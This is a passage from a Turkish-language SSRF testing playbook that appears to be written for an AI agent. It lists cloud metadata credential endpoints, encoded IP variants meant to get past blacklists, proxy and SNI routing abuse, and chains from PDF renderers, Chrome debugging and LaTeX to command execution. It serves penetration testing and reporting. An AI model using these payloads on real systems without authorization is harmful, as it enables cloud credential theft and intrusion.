- **Endpoint:** `http://100.100.100.200/latest/meta-data/`
  (Alibaba Cloud, AWS'nin `169.254.169.254`'ünden **farklı** bir IP
  kullanır — bu, §7'deki "cevap yok" durumunda denenmesi gereken
  alternatif provider IP'lerinden biridir).
  ```
  http://100.100.100.200/latest/meta-data/ram/security-credentials/
  ```

### 12.11 Oracle Cloud Infrastructure (OCI) — Metadata Server

- **Endpoint:** `http://169.254.169.254/opc/v2/instance/` (v2, header
  zorunlu) veya `http://169.254.169.254/opc/v1/instance/` (v1, eski/
  header'sız).
  ```
  http://169.254.169.254/opc/v2/instance/
  Header: Authorization: Bearer Oracle
  ```

### 12.12 DigitalOcean — Metadata Server

- **Endpoint:** `http://169.254.169.254/metadata/v1/`
  ```
  http://169.254.169.254/metadata/v1/user-data
  http://169.254.169.254/metadata/v1/id
  ```
  (DigitalOcean'ın metadata servisi genelde ek bir header
  gerektirmez — bu, AWS IMDSv2/GCP/Azure'a göre daha "SSRF-friendly"
  bir tasarımdır, tespit edilirse impact assessment'ta bu kolaylık
  not edilmeli.)

### 12.13 Kubernetes — API Server ve Kubelet

- **API server (kimlik doğrulamalı, bir service account token'ı
  gerektirir — SSRF tek başına yeterli olmayabilir, §11'de belirtilen
  zincire bakınız):**
  ```
  https://kubernetes.default.svc/api/v1/namespaces/<ns>/pods
  Header: Authorization: Bearer <service-account-token>
  ```
- **Kubelet API (bazı yapılandırmalarda kimlik doğrulamasız):**
  ```
  http://<node-ip>:10250/pods
  http://<node-ip>:10255/pods       (salt-okunur, eski/bazı ortamlarda hâlâ açık)
  ```

### 12.14 Fingerprint Hızlı Referans Tablosu — Cloud Metadata

| Provider | IP/Host | Zorunlu Header | Token Adımı Gerekir mi |
|---|---|---|---|
| AWS (IMDSv1) | `169.254.169.254` | Yok | Hayır |
| AWS (IMDSv2) | `169.254.169.254` | `X-aws-ec2-metadata-token` | Evet (`PUT` ile) |
| GCP | `metadata.google.internal` / `169.254.169.254` | `Metadata-Flavor: Google` | Hayır (header yeterli) |
| Azure | `169.254.169.254` | `Metadata: true` | Hayır (header yeterli) |
| Alibaba Cloud | `100.100.100.200` | Yok (genelde) | Hayır |
| Oracle Cloud (v2) | `169.254.169.254` | `Authorization: Bearer Oracle` | Hayır (header yeterli) |
| DigitalOcean | `169.254.169.254` | Yok | Hayır |
| Kubernetes API server | `kubernetes.default.svc` | `Authorization: Bearer <token>` | Evet (token başka yoldan elde edilmeli) |

**`169.254.169.254`'ün hazır encode edilmiş varyantları (§8.2.2'deki
genel IP encoding tekniğinin bu spesifik IP'ye uygulanmış, hazır
hesaplanmış hali — blacklist yalnızca literal string'i arıyorsa
bunlardan biri işe yarayabilir):**
```
http://2852039166/                          (decimal)
http://0251.0376.0251.0376/                 (octal)
http://0xa9fea9fe/                          (hex, tam sayı)
http://0xa9.0xfe.0xa9.0xfe/                 (hex, nokta ayraçlı)
http://169.254.43518/                       (kısaltılmış, son 2 oktet birleşik)
http://[::ffff:169.254.169.254]/            (IPv6-mapped)
http://[::ffff:a9fe:a9fe]/                  (IPv6-mapped, hex)
http://[fd00:ec2::254]/                     (AWS'e özgü IPv6 ULA adresi — bazı modern VPC/IPv6-only ortamlarda IMDS'e bu adresten de erişilebilir)
```

### 12.15 Diğer Cloud/VPS Sağlayıcıları — AWS Dışındaki Yaygın Metadata Servisleri

AWS/GCP/Azure dışında, özellikle Avrupa merkezli VPS sağlayıcılarında
ve OpenStack tabanlı private/enterprise cloud'larda sıkça karşılaşılan,
aynı `169.254.x.x` link-local deseniyle çalışan metadata servisleri:

- **Hetzner Cloud** — aynı IP'yi (`169.254.169.254`) AWS ile paylaşır,
  ama farklı bir path prefix'i kullanır, header gerektirmez:
  ```
  http://169.254.169.254/hetzner/v1/metadata
  http://169.254.169.254/hetzner/v1/metadata/hostname
  http://169.254.169.254/hetzner/v1/metadata/instance-id
  http://169.254.169.254/hetzner/v1/metadata/private-networks
  ```
- **Linode / Akamai Connected Cloud** — kendi IP'sinde (`169.254.169.254`)
  ama AWS IMDSv2'ye benzer bir token akışı gerektirir:
  ```
  PUT http://169.254.169.254/v1/token
  Header: Metadata-Token-Expiry-Seconds: 3600

  → dönen token ile:
  GET http://169.254.169.254/v1/instance
  Header: Metadata-Token: <token>
  GET http://169.254.169.254/v1/network
  Header: Metadata-Token: <token>
  ```
- **Vultr** — aynı IP (`169.254.169.254`), IMDSv1'e benzer şekilde
  token'sız erişilebilir:
  ```
  http://169.254.169.254/v1.json
  ```
- **Scaleway — KRİTİK FARK: tamamen farklı bir IP kullanır** (AWS/GCP/
  Azure/Hetzner/Linode/Vultr'un hepsinin paylaştığı `169.254.169.254`
  **değil**, kendine özgü `169.254.42.42`) — bu nedenle yalnızca
  `169.254.169.254`'ü hedefleyen bir test/blacklist bu provider'ı
  tamamen kaçırır:
  ```
  http://169.254.42.42/conf
  http://169.254.42.42/conf?format=json
  http://169.254.42.42/user_data
  http://[fd00:42::42]/conf                 (IPv6 varyantı)
  ```
  **Not:** Scaleway'in `user_data` endpoint'i, isteğin 1024 altı bir
  kaynak porttan gelmesini zorunlu kılar (`CAP_NET_BIND_SERVICE`/
  root gerektirir) — bir web uygulaması sürecinden tetiklenen tipik
  bir SSRF'nin varsayılan olarak yüksek/rastgele bir kaynak port
  kullanması nedeniyle bu spesifik endpoint pratikte erişilemez
  olabilir; `/conf` endpoint'i bu kısıtlamaya tabi değildir.
- **OpenStack tabanlı private/enterprise cloud'lar (birçok kurumsal
  iç bulut ve bazı bölgesel public cloud sağlayıcısı OpenStack Nova
  üzerine kuruludur) — hem EC2-uyumlu hem native format sunar:**
  ```
  http://169.254.169.254/latest/meta-data/          (EC2-uyumlu format)
  http://169.254.169.254/openstack/latest/meta_data.json   (native format)
  http://169.254.169.254/openstack/latest/user_data
  http://[fe80::a9fe:a9fe%<interface>]/openstack/latest/meta_data.json   (IPv6 link-local, arayüz zone-id gerektirir)
  ```
  OpenStack fingerprint'i tespit edildiğinde (§7), EC2-uyumlu path'in
  çalışması hedefin **hangi bulutta olduğunu yanlış işaret
  edebileceğini** unutma — `latest/meta-data/` başarılı dönse bile
  hedefin gerçek AWS olduğunu varsaymadan önce `openstack/latest/
  meta_data.json`'ı da dene, ikisi de dönerse OpenStack'tir.
- **Diğer bölgesel sağlayıcılar (Tencent Cloud, Huawei Cloud, IBM
  Cloud gibi) da benzer bir link-local metadata deseni sunar** — bu
  skill bunların tam endpoint/path detaylarını (doğrulanmamış
  bilgiyi hard-code etmeme prensibi gereği, bkz. §15) burada
  listelemez; hedefte bu sağlayıcılardan biri tespit edilirse (§7),
  o providerın güncel resmi metadata servisi dokümantasyonundan
  ampirik olarak doğrulanması önerilir — genel arama deseni her
  zaman aynıdır: `169.254.169.254` (veya sağlayıcıya özgü bir
  link-local IP) + `/latest/meta-data/`, `/metadata/`, `/v1/`,
  `/openstack/` gibi yaygın path önekleri.

### 12.16 [Infrastructure/Proxy-Mediated SSRF] Reverse Proxy / API Gateway Misconfigürasyonu — Absolute-URI ve SNI Routing İstismarı

**Kategori notu — bu skill'i uygulayan agent için önemli bir
hatırlatma:** Buraya kadarki tüm profiller (§12.1-§12.15)
**Application-level SSRF** modeline dayanır: `parametre → uygulama
kodu → HTTP client çağrısı`. Bu bölüm ise farklı bir kategoridir —
**Infrastructure/Proxy-Mediated SSRF**: `saldırgan isteği → proxy/
gateway'in kendi routing mantığı → keyfi upstream`. Bir hedefte
§2'deki application-level sink taraması (URL parametresi, webhook
alanı vb.) **hiçbir aday bulamasa bile**, bu, testin bittiği anlamına
gelmez — önündeki reverse proxy/API gateway katmanı da ayrıca bu
kategori altında test edilmelidir; ikisi birbirinin yerine geçmez.

Bu, klasik "parametre kontrol edilebiliyor" SSRF modelinden **farklı**
bir hedef profilidir: burada zafiyet bir uygulama parametresinde
değil, **reverse proxy/API gateway'in kendi routing mantığında**
bulunur — **routing manipülasyonu confirmed olduktan sonra** sonuç
SSRF'e eşdeğer bir etki yaratabilir (saldırgan, proxy'yi **pre-auth
bir forward proxy'ye** dönüştürerek internal ağa/`localhost`'a bağlı
servislere tam okuma erişimi kazanabilir) — ama bu sınıflandırma
**otomatik değildir**: önce aşağıdaki tekniklerden birinin
(absolute-URI/SNI routing manipülasyonu) gerçekten hedefin routing
kararını değiştirdiği **bağımsız olarak doğrulanmalı** (örn. farklı
bir authority/SNI değeriyle farklı bir backend'den yanıt alındığının
gösterilmesi), ancak o zaman `INFRASTRUCTURE_MEDIATED_SSRF` olarak
sınıflandırılmalıdır (§14.1).

- **Absolute-URI request line istismarı:** Bazı reverse proxy/gateway
  yapılandırmaları, gelen bir HTTP isteğinin **request line**'ındaki
  authority kısmını (`GET http://<authority>/path HTTP/1.1` formundaki
  "absolute-URI" biçimi — normalde yalnızca forward proxy'lere özgü
  bir sözdizimidir) **normal host-based routing'in üzerine
  yazacak** şekilde yanlış yapılandırılmış olabilir. `Host:` header'ı
  bu durumda genelde **yok sayılır** — yani saldırgan, `Host:`
  header'ı ne olursa olsun, request line'daki authority'yi doğrudan
  hedef seçmek için kullanabilir.
- **SNI (Server Name Indication) alanı üzerinden routing:** Benzer bir
  misconfiguration deseni, TLS handshake'indeki SNI alanının
  **doğrudan** (ek bir doğrulama olmadan) backend seçimi/routing için
  kullanılmasıdır — saldırgan SNI alanına internal bir hostname/IP
  yazarak proxy'yi o backend'e yönlendirebilir.
  ```nginx
  # Örnek — yanlış yapılandırılmış bir Nginx stream/SNI-preread bloğu,
  # SNI değerini doğrulamadan doğrudan upstream olarak kullanır
  map $ssl_preread_server_name $backend {
      default $ssl_preread_server_name;
  }
  ```
- **Etki:** Bu iki desenin ikisi de **full-response** SSRF ile
  sonuçlanır — proxy, internal hedeften dönen **tam cevabı** saldırgana
  geri akıtır, bu da yalnızca blind probe değil, doğrudan internal
  servislerin (SOAP/Axis2 endpoint'leri, Keycloak admin arayüzleri,
  diğer admin console'ları) **enumerate edilip etkileşime
  girilmesini** sağlar.
- **Tespit:** Standart parametre-tabanlı SSRF testleri bu deseni
  yakalamaz — bunun yerine ham HTTP isteğinin request line'ını elle
  (raw socket/`nc`/Burp Repeater'ın "raw" modu ile) absolute-URI
  formatında oluşturup denemek gerekir; bu nedenle bu profil, §4 Sink
  Discovery'nin **protokol/altyapı seviyesi** bir uzantısıdır,
  uygulama parametresi seviyesinde değil.

---

## 13. CMS / Framework / Platform → Bilinen SSRF Sink Eşleme Tablosu

**Önemli düzeltme:** Aşağıdaki eşlemeler **varsayılan/tipik özellik**
bilgisidir, her sürümde/yapılandırmada zafiyet olduğu anlamına
gelmez. "Davranış Bağımlılığı" sütunu bu eşlemenin default mu,
configuration/version'a mı bağlı olduğunu belirtir.

| Platform | Bilinen SSRF-Prone Özellik | Davranış Bağımlılığı |
|---|---|---|
| WordPress | Pingback mekanizması (`xmlrpc.php`, `pingback.ping`), `wp_remote_get()` kullanan eklentiler | Default behavior (pingback) + application-specific (eklentiler) |
| Jira / Confluence (Atlassian) | Webhook/entegrasyon URL alanları, "gadget" harici veri kaynağı tanımlama | Version-dependent |
| GitLab | "Import project from URL", webhook URL tanımlama, CI/CD entegrasyonları | Default behavior — bkz. §2 kategori 10 (repository import) |
| Jenkins | Plugin webhook'ları, "harici bir URL'den yapılandırma çek" özellikleri | Application-specific (plugin'e bağlı) |
| Grafana | "Data source" tanımlama (bir dashboard'un veri çektiği URL) | Default behavior — klasik bir SSRF sink örneğidir |
| Kurumsal admin panelleri (genel — Jira/Confluence, self-hosted CRM/ERP, identity/SSO yönetim araçları) | SMTP relay / LDAP dizini / özel SSO endpoint'i yapılandırma + "Test Connection" butonu | Default behavior — bkz. §2 kategori 14 |
| Self-hosted monitoring/observability araçları (Prometheus Alertmanager, Zabbix, Nagios benzeri) | Alert/notification hedefi olarak özel bir webhook/SMTP/LDAP endpoint'i tanımlama | Default behavior — bkz. §2 kategori 14 |
| Kibana / Elasticsearch | Bazı plugin/entegrasyon URL alanları | Application-specific |
| Redmine / Trac | Harici bağlantı/repository URL alanları | Application-specific |
| Slack-benzeri mesajlaşma platformları (self-hosted, örn. Mattermost, Rocket.Chat) | Link preview/"unfurl" özelliği | Default behavior — bkz. §2 kategori 1 |
| Discourse (forum yazılımı) | Link önizleme, "oneboxing" (bir URL'i zengin içerik kartına çevirme) | Default behavior |
| WordPress/Drupal/Joomla eklenti ekosistemi — "URL'den resim/medya çek" | Medya kütüphanesi "URL'den yükle" özelliği | Application-specific (çekirdek + eklenti) |
| wkhtmltopdf / Puppeteer / headless Chrome tabanlı PDF/rapor üretimi | HTML render sırasında harici kaynak (resim/script/iframe) çekme | Default behavior — bkz. §2 kategori 3 |
| ImageMagick | Bazı delegate/coder'lar (örn. eski `MSL`/`MVG` coder'ları) URL tabanlı kaynak çekebilir | Version-dependent (modern sürümlerde `policy.xml` ile kısıtlanabilir) |
| Apache Solr | "Remote streaming" özelliği (`stream.url` parametresi) | Configuration-dependent (varsayılan olarak bazı sürümlerde kapalı) |
| Shopify/e-ticaret platformları — "webhook" ve "app entegrasyonu" URL'leri | Uygulama mağazası entegrasyon URL'leri | Application-specific |
| OAuth/OIDC Identity Provider entegrasyonları | "Discovery URL"/"metadata URL" alanı (`.well-known/openid-configuration` çekimi) | Default behavior — bkz. §2 kategori 7 |
| SAML Service Provider'lar | "IdP metadata URL'i" alanı | Default behavior |
| Video transcoding servisleri (self-hosted, örn. bazı medya sunucu yazılımları) | "URL'den video indir/işle" | Default behavior — bkz. §2 kategori 11 |
| Monitoring/uptime-check araçları (self-hosted) | "İzlenecek URL" tanımlama — genelde kasıtlı bir özellik | Default behavior — bkz. §6.1 yetki context'i |
| RSS/Atom feed okuyucuları (self-hosted) | Feed URL'i çekme | Default behavior |
| PDF imzalama/doğrulama servisleri | "Doğrulama URL'i"/"zaman damgası sunucusu URL'i" alanı | Application-specific |
| Java tabanlı enterprise uygulamalar (genel) | `URLConnection`/`HttpURLConnection` üzerinden URL açan herhangi bir özellik (çok geniş bir dosya/protokol şeması desteği sunar — `file://`, `jar://`, `netdoc://` dahil, bkz. §12.5) | Default behavior — Java'nın URL handling mimarisi diğer dillere göre daha geniş protokol desteği sunar |
| PHP tabanlı uygulamalar (genel, `allow_url_fopen`/cURL) | `file_get_contents()`, `fopen()`, cURL ile URL açan herhangi bir özellik — geniş protokol şeması desteği (`gopher://` dahil, cURL build'ine bağlı) | Configuration-dependent (`allow_url_fopen` ayarına bağlı) |
| .NET tabanlı uygulamalar | `HttpClient`/`WebRequest` ile URL açan özellikler | Default behavior — modern `HttpClient` bazı eski şemaları (`file://`) desteklemez |
| Webmail/e-posta istemcileri (self-hosted) | "Uzak resim yükleme" (e-posta içindeki harici resimleri sunucu tarafında proxy'leyerek gösterme — gizlilik amaçlı bir özellik, ama SSRF riski taşır) | Default behavior |
| API Gateway / BFF katmanları (genel) | Dinamik upstream/route tanımlama — bkz. §11 microservice notu | Application-specific |
| n8n / Node-RED / Zapier-benzeri no-code otomasyon araçları | "HTTP Request" node'u — **kasıtlı ve dokümante edilmiş** bir SSRF-benzeri özellik | Default behavior — bkz. §6.1, asıl soru yetkilendirme/hedef kısıtlaması |
| Swagger UI / Postman / API dokümantasyon-test araçları | "Import from URL" ile OpenAPI/Swagger spesifikasyonunu bir URL'den çekme özelliği | Default behavior — bkz. §2 kategori 10 (repository/API-spec import) |

### 13.1 PDF/HTML Render Zincirlerinde Derinlemesine Exploitation

`wkhtmltopdf`/Puppeteer/headless Chrome gibi HTML-render-to-PDF/image
araçları, yukarıdaki tabloda tek satır olarak geçse de, SSRF'in
ötesine geçebilen üç ayrı yapılandırma-bağımlı zincir sunar:

- **wkhtmltopdf `--enable-local-file-access` ile `file://` + `http://`
  kombinasyonu:** Bu bayrak açıksa, render edilen HTML içinden
  `file://` şemasıyla yerel dosya okunabilir (§12.2 ile aynı impact)
  **ve** bu iki farklı şema aynı render işleminde birlikte
  kullanılabilir — örn. `file://` ile okunan bir dosyanın içeriği,
  aynı render sürecinde `http://` ile canary'ye POST edilen bir
  formun içine enjekte edilerek blind bir dosya-okuma senaryosunda
  bile exfiltration sağlanabilir (SSRF ile dosya içeriğini "response'a
  yansıtma" imkanı olmasa bile, bir sonraki `http://` isteğinin
  body'sine gömülerek OOB ile dışarı taşınabilir).
- **Puppeteer/headless Chrome — `--no-sandbox` + `--remote-debugging-
  port` kombinasyonu ile SSRF → RCE zinciri:** Eğer render işlemini
  yürüten Chrome instance'ı bu iki bayrakla başlatılmışsa VE
  debugging portu (genelde `9222`) internal ağdan erişilebilirse, bir
  SSRF bu debugging port'una ulaşıp Chrome DevTools Protocol (CDP)
  üzerinden **doğrudan komut çalıştırmaya kadar** giden bir zincir
  kurabilir (CDP'nin `Page.navigate`/`Runtime.evaluate` gibi
  metotları, sandbox kapalıyken dosya sistemi erişimine kadar
  genişleyebilir). Bu, §12.3'teki "protokol smuggling" mantığının
  Chrome'un kendi debug protokolüne uygulanmış bir örneğidir — dict/
  gopher yerine CDP'nin WebSocket tabanlı JSON-RPC'si smuggle edilir.
- **LaTeX rendering — `\input{|command}` deseni (az bilinen ama
  kritik bir alt-vektör):** Bazı LaTeX motorları (özellikle
  `shell-escape` etkinse) `\input{|<komut>}` sözdizimiyle bir komutun
  çıktısını dosya içeriği gibi işleyebilir — bu SSRF'in kendisi değil
  bir komut enjeksiyonudur, ama HTML/LaTeX render zincirlerinde
  (örn. bir "URL'den PDF üret" özelliğinin arka planda LaTeX
  kullanması) aynı sink'in her ikisine de (SSRF + command injection)
  açık olabileceği unutulmamalı — ikisi ayrı bulgular olarak
  raporlanmalı, kök neden aynı render zinciri olsa da.

---

## 14. Raporlama ve Payload Metadata Şeması

### 14.1 Raporlama Şablonu

Her SSRF bulgusu için rapor şu unsurları içermelidir:

1. **`vulnerability_class`** — bulgunun gerçek sınıfı, açıkça
   etiketlenir: `SSRF` / `OPEN_REDIRECT` (yanlışlıkla SSRF sanılmaması
   için, bkz. §3.1) / `XXE_SSRF_CHAIN` (XXE üzerinden dolaylı, bkz.
   §3.3) / `SSRF_AUTHORIZATION_BYPASS` (kasıtlı bir ağ aracının
   yetkisiz erişime açık olması, bkz. §6.1) / `PROTOCOL_SMUGGLING`
   (gopher/dict üzerinden internal servis manipülasyonu, bkz. §12.3)
   / `INFRASTRUCTURE_MEDIATED_SSRF` (reverse-proxy/gateway routing
   istismarı, application-level bir sink DEĞİL, bkz. §12.16) /
   `UNKNOWN`. **`file://` sonucu için özel not:** `file://` ile elde
   edilen bir dosya okuma, tek eksenli `SSRF` etiketi yerine iki
   eksenli raporlanmalıdır — `delivery: file` (§12.2, taşıma
   mekanizması SSRF'in genel modeliyle aynıdır) + `impact_class:
   local-file-read` (nihai etki, ağ üzerinden bir hedefe erişim değil,
   dosya sistemi okumasıdır) — bu, "SSRF" teriminin network-request
   çağrışımıyla tam örtüşmeyen bu sonucu daha doğru tanımlar.
2. **Hedef:** URL/route, HTTP method, etkilenen parametre/alan.
3. **SSRF türü ve confidence seviyesi** — **SSRF classification** ve
   **target classification** §8.4'teki tanıma göre **ayrı ayrı**
   raporlanır:
   - SSRF (causality) "confirmed" mi: Eksen 1'den **tek bir kanıt
     türü** (full/reflected / OOB / semi-blind-differential /
     stored-indirect) **yeterlidir** — DNS-only OOB için §8.4'teki
     koşullu kural geçerlidir.
   - Target (attribution) "confirmed" mi: en az bir Strong indicator
     + tutarlı behavior — SSRF classification'ından bağımsız bir alan.
   - Full mu Blind mi Semi-blind mi — bu ayrım (§1.4) rapor
     seviyesinde de zorunlu olarak belirtilmelidir çünkü impact
     kanıtlama yöntemini doğrudan etkiler.
   - **`network_capability`** — blind/semi-blind bulgular için ayrıca
     belirtilir: `dns-only` (yalnızca DNS çözümlemesi gözlemlendi,
     P2a/P3 koşullu) / `tcp-connect` (bağlantı kuruldu ama protokol
     tamamlanmadı) / `full-protocol` (P4 tamamlandı, HTTP/protokol
     etkileşimi doğrulandı). Bu alan, "DNS-only SSRF" gibi daha zayıf
     bir bulgunun "full SSRF" ile aynı güvenle raporlanmasını önler
     — ikisi de `confirmed` olabilir (DNS-only, §8.4'teki koşullar
     sağlanırsa) ama `network_capability` farkı okuyucuya gerçek
     kapsamı netleştirir.
   - confidence_score (§10.5) yalnızca destekleyici bilgidir.
4. **Detection payload'ı** — tam request/response ve interactsh log
   kaydı (varsa).
5. **Confirmation kanıtı** — "confirmed" için gereken tek Eksen-1
   kanıtının kendisi ve onun §5.1'e göre kurulmuş negatif kontrolü.
6. **Beklenen vs gerçekleşen sonuç** — net karşılaştırma.
7. **False-positive olmadığının kanıtı** — negatif kontrol, ve
   gerekiyorsa Open Redirect/XXE ayrımının gösterimi.
8. **Impact assessment gerekçesi** — §10.4'teki dört eksen: hedefin
   niteliği, elde edilen bilginin hassasiyeti, protokol smuggling ile
   ikincil etki var mı, yetkilendirme/allowlist context'i.
9. **Reproduction adımları** — başka birinin aynı sonucu tekrar
   üretebilmesi için yeterli detay.

**Rapora eklenmemesi gerekenler:** Zafiyeti kanıtlama amacı taşımayan,
elde edilebilecek credential'larla yapılabilecek zararlı aksiyonların
ayrıntılı bir listesi; zafiyetle doğrudan ilgisi olmayan hedef sistem
iç bilgileri.

### 14.2 Payload Metadata Şeması

Yeni bir payload eklerken, şu alanları takip et:

| Alan | Açıklama |
|---|---|
| protocol | Hangi protokol/şema (http/https/file/gopher/dict/ftp/ldap/jar/netdoc veya "generic") |
| target_environment | Hangi ortam (AWS/GCP/Azure/Alibaba/Oracle/DigitalOcean/Kubernetes/internal-generic) |
| syntax | Tam payload metni |
| context | full-url/hostname-only/path-fragment/header-value/xml-entity/config-value |
| purpose | detection / fingerprinting / confirmation / impact |
| expected_result | Beklenen çıktı (ham/raw temsil) |
| alternatives | Eşdeğer alternatif syntax'lar (IP encoding varyantları vb.) |
| behavior_dependency | default / configuration-dependent / version-dependent / application-specific |
| evidence_category | full-reflected / OOB / semi-blind-differential / stored-indirect / target-fingerprint |
| fp_risk | Yanlış pozitif riski: düşük / orta / yüksek |
| kaynak | Bu payload'ın kökeni |
| payload_stage *(yeni eklenen payload'lar için zorunlu)* | §1.5 Payload Stage Model'e göre: P0-input-acceptance / P1-parsing / P2a-dns-resolution / P2b-tcp-connection-attempt / P3-confirmed-contact / P4-protocol-negotiation / P5-response-capture / P6-impact |
| prerequisites *(yeni eklenen payload'lar için zorunlu)* | Bu payload'ın çalışması için gerekli önkoşullar (örn. `redirect_following=true`, `imds_version=v1`, `gopher_scheme_supported=true`) |
| side_effect_level *(yeni eklenen payload'lar için zorunlu)* | none / read-only / external-interaction (OOB) / state-changing (örn. Redis'e yazma) |

**Geriye dönük etiketleme yapılmıyor** — bu üç alan yalnızca
**bundan sonra eklenecek** içerik için zorunludur.

---

## 15. Referans Araçlar ve Kaynaklar

**Araçlar:**
- **interactsh-client** (bkz. §9.3) — OOB testleri için birincil ve
  bu skill'in merkezi bağımlılığı; blind SSRF confirmation'ının büyük
  çoğunluğu bu araca dayanır.
- **Gopherus** (`tarunkant/Gopherus`) — gopher protokol smuggling
  payload'larını (Redis, Memcached, SMTP, MySQL, FastCGI için) doğru
  RESP/binary encoding ile otomatik üreten bir araç; §12.3'teki elle
  hazırlanan payload'ların encoding hatasına açık olması nedeniyle
  gerçek testte bu aracın kullanılması önerilir.
- **remote-method-guesser** — Java RMI hedeflerine karşı gopher
  payload'ı hazırlamak/kullanmak için (Gopherus'un Java RMI'a özgü
  bir tamamlayıcısı); Java-tabanlı bir hedefte RMI servisi tespit
  edilirse kullanılır.
- **SSRFmap** — bilinen SSRF payload ailelerini (cloud metadata,
  protokol şemaları, IP encoding varyantları) otomatik deneyen bir
  tarama aracı; bu skill'in §5/§8'deki manuel/sinyal-güdümlü
  metodolojisinin yerine değil, tamamlayıcısı olarak düşünülmelidir —
  otomatik tarama negatif dönse bile bu skill'deki context-detection
  ve bypass metodolojisi elle uygulanmalıdır.
- **ipfuscator** (`dwisiswant0/ipfuscator`) — §8.2.2'deki IP encoding
  varyantlarının (decimal/octal/hex/karışık taban) tamamını bir IPv4
  adresinden otomatik üreten bir araç; elle üretmek yerine bu skill'in
  §8.2.1 sıralı deneme stratejisiyle birlikte kullanılabilir.
- **r3dir** (`Horlad/r3dir`) — §8.2.4'teki redirect-tabanlı bypass
  için kendi sunucunu barındırmadan seamless redirect-hedef fuzzing
  sağlayan bir redirection servisi; Burp'e Hackvertor tag'leriyle
  entegre edilebilir.
- **Singularity of Origin** — DNS rebinding saldırıları için özelleşmiş
  bir framework/araç (bkz. §3.5); `1u.ms` gibi hazır bir servis
  yeterli olmadığında (özel TTL/IP çifti senaryoları gerektiğinde)
  kullanılır.
- **OOB yakalama alternatifleri (interactsh dışında, denklik amaçlı
  listelenmiştir — bu skill interactsh'i birincil araç olarak
  benimser, §9.3):** Burp Collaborator (Burp Suite'e entegre),
  `canarytokens.org`, `ssrf-sheriff` (`teknogeek/ssrf-sheriff`),
  `webhook.site`, `pingb.in`.

**Bilgi kaynakları (araç değil, referans dokümantasyon):**
- **PortSwigger Web Security Academy — "Server-side request forgery
  (SSRF)"** — SSRF'nin temel taksonomisi (full/blind), cloud metadata
  istismarı ve yaygın bypass tekniklerine dair birincil eğitim
  kaynağı.
- **PayloadsAllTheThings** (`swisskyrepo/PayloadsAllTheThings`) —
  "Server Side Request Forgery" bölümü; cloud provider'a özgü
  metadata endpoint listeleri, IP encoding varyantları ve redirect
  status code (307/308) notları için geniş bir referans.
- **HackTricks** — "SSRF (Server Side Request Forgery)" ve
  "URL Format Bypass" alt sayfaları; protokol şeması istismarı, curl
  URL globbing, ve anormal redirect status code zinciri gibi ileri
  seviye teknikler için güncel tutulan bir kaynak, düzenli olarak
  tekrar kontrol edilmelidir.
- **Orange Tsai — "A New Era of SSRF: Exploiting URL Parser in
  Trending Programming Languages"** (Black Hat araştırması) — §8.2.3'teki
  parser confusion payload'larının birincil kaynağı; farklı dillerin
  URL parser'larının RFC 3986 yorumlama farklarını sistematik olarak
  belgeler.
- **Cloud provider resmi dokümantasyonu** (AWS IMDSv2 geçiş rehberi,
  GCP metadata server güvenlik notları, Azure IMDS dokümantasyonu) —
  her provider'ın kendi SSRF-koruma mekanizmasının (token/header
  zorunluluğu) güncel davranışını doğrulamak için birincil kaynaktır.
- **Not — bu dosyada bilinçli olarak yapılmayan bir şey:** Bu skill
  dosyası, hiçbir yerde spesifik bir CVE/GHSA kimliği veya kesin
  sürüm numarası hard-code etmez — davranış (ör. "IMDSv2 zorunlu
  ortamlarda token adımı gerekir") anlatılır ve şüpheli/yüksek etkili
  bir iddiayla karşılaşıldığında güncel kaynaktan **testte ampirik
  olarak** doğrulanması önerilir.
- **`verify_before_use` prensibi — özellikle bölgesel/az yaygın cloud
  provider profilleri için (§12.10-§12.15):** Bu skill'deki Hetzner,
  Linode/Akamai, Vultr, Scaleway, OpenStack gibi daha az global
  hedefte karşılaşılan provider profilleri, yazım anında doğrulanmış
  resmi dokümantasyona dayanır — ama bu tür sağlayıcıların
  API'leri/endpoint yolları AWS/GCP/Azure'a göre **daha sık ve daha az
  duyurulu** şekilde değişebilir. Bu profillerden biri kullanılmadan
  önce (özellikle bir payload art arda birkaç denemede de negatif
  dönüyorsa), agent'ın o provider'ın **o anki** resmi dokümantasyonunu
  hızlıca teyit etmesi (bir web araması ile) önerilir — bu, ekstra bir
  "izin" adımı değil, request bütçesini (§10.6) yanlış/eskimiş bir
  path'e harcamamak için bir verimlilik adımıdır.

---

## 16. SSRF → RCE Zincirleri (Impact Yükseltme Referansı)

Bu bölüm, §10.4'teki impact assessment'ı somutlaştırmak için, bu
skill'in daha önce tanımladığı bileşenlerin (§12 protokol profilleri,
§11 modern mimari, §9.1 stored/indirect) **nasıl art arda
zincirlenerek RCE'ye kadar gidebileceğini** özetler — yeni bir teknik
tanımlamaz, mevcut bölümlere çapraz referans verir.

**Derinleşme Triage Gate — KRİTİK, request bütçesini korur:** Bir
SSRF confirmed olduğunda, aşağıdaki zincirlerin **hepsini otomatik
olarak** denemek (gopher→Redis→FastCGI, K8s exec, Envoy config
manipülasyonu vb.) hem gereksiz request bütçesi tüketir hem de
düşük-değerli bir SSRF'i orantısız bir efor gerektiren bir "impact
avcılığına" çevirir. Derinleşmeden önce hızlı bir triage sorusu
sorulmalı — bu bir **eleme** değil, **derinleşme sırasını belirleme**
mekanizmasıdır (aynı §2'deki host/parametre skorlaması mantığı):

```
SSRF confirmed
   ↓
Hedef ne? (scheme_support/Sink Capability Matrix'ten, §7)
   ├─ Yalnızca kendi kontrolündeki canary/dış bir servis
   │  → düşük öncelikli derinleşme; bulguyu full/blind SSRF olarak
   │    raporla, gopher/RCE zincirlerini DENEMEDEN bırakmak makuldür
   │    (yine de scope/zaman izin veriyorsa denenebilir, yasak değil)
   ├─ 169.254.169.254/cloud metadata veya bilinen bir internal servis
   │  (Redis/Elasticsearch/K8s API vb. fingerprint edildi)
   │  → YÜKSEK öncelikli derinleşme; ilgili §12 profili ve/veya
   │    aşağıdaki zincir tablosu uygulanır
   └─ Bilinmiyor/henüz fingerprint edilmedi
      → önce §7 fingerprinting'e geri dön, hedefi belirle, sonra
        bu triage'a geri gel
```

Bu triage, **hiçbir zinciri yasaklamaz** — yalnızca "hangi sırayla,
ne kadar efor harcanacağı" kararını hedefin gözlemlenen değerine
bağlar. Düşük değerli bir hedefte de scope/zaman bolsa zincirler
denenebilir; yüksek değerli bir hedefte bu triage'ı atlayıp
doğrudan derinleşmek her zaman haklıdır.

**KRİTİK ÖNKOŞUL GATE — bu bölüm §10'daki confirmation'ın YERİNE
geçmez:** Aşağıdaki her zincir, **yalnızca** SSRF ve zincirdeki **her
ara kapasite bağımsız olarak confirmed olduktan sonra** bir sonraki
